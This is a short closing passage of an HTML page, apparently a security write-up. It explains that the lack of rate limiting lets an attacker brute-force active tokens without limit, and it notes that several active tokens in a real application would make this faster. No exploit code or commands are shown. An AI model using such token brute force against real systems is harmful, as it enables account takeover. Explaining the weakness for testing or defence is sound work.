+</code></pre><blockquote id="7d0b9f71-b162-459d-aeff-d06287921eb3" class="">This way, an attacker is able to compromise active tokens via bruteforce in an unlimited way.</blockquote><blockquote id="a060cb95-e450-412c-abaa-2babe0ddfbc3" class="">[Note] In a real application there might be multiple active tokens. As we have just one active token, the time for bruteforcing it might be much longer.</blockquote></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
